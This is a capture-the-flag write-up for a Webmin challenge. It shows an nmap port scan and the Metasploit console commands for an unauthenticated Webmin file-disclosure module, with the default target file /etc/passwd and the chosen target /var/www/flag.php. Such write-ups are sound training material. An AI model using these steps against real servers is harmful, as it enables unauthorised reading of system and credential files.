Webmin - Exploit 2
========================
## Challenge:

> **Description:** This challenge had us connecting to a server where the following information was shown. A flag.php file and a webmin folder containing a config file.
>
> **Goal:** Find the flag for 2000 Points.

## Solution:

Solving this problem was pretty fun. Though the taunt of having flag.php right in front of me was painful. First off I began by looking through the provided files. It was no surprise that flag.php wasn't going to contain the viewable flag. So, onto the next file, webmin. This folder contained a basic webmin config file that provided no real useful information either. So what do. I know that there is a flag.php file somewhere on the server that most likely contains the flag, and that the server is running webmin.

Armed only with that information I figured something else had to be on the server. Bring in good old nmap.
```
nmap -Pn 54.221.X.X

Port      State Service
22/tcp    open  ssh
443/tcp   open  https
10000/tcp open  snet-sensor-mgmt
```

Wooh! Whats that!? snet-sensor-mgmt running on port 10000? Interesting. After giving that a go I found myself at a webmin login page. I started broswing the googles for any default accounts or passwords but I soon found there were none. Better yet the server implemented a timeout mechanism to stop brute forcing. Huh, what now?

Well. There _has_ to be another way. Are there any exploits for webmin?? Ah lookie [here](http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure), this looks interesting. Now given our knowledge of flag.php, our best bet is that it resides in /var/www/. So lets fire it up.
```
msf auxiliary(file_disclosure) > use auxiliary/admin/webmin/file_disclosure
msf auxiliary(file_disclosure) > show options

Module options (auxiliary/admin/webmin/file_disclosure):

Name     Current Setting    Required  Description
----     ---------------    --------  -----------
DIR      /unauthenticated   yes       Webmin directory path
Proxies                     no        Use a proxy chain
RHOST    54.221.*.*         yes       The target address
RPATH    /etc/passwd        yes       The file to download
RPORT    10000              yes       The target port
VHOST                       no        HTTP server virtual host

set RPATH /var/www/flag.php
```

Boom! We have a flag!
